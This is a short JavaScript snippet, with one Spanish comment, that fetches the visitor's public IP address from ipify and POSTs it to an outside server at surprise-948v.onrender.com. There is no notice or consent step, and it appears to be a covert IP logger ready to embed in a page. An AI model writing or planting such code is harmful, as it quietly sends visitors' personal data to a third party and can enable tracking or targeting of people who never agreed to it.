const res = await fetch('https://api.ipify.org?format=json');
const data = await res.json();
const ip = data.ip;

// Aquí usas tu enlace de Glitch
await fetch('https://surprise-948v.onrender.com', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ ip })
});
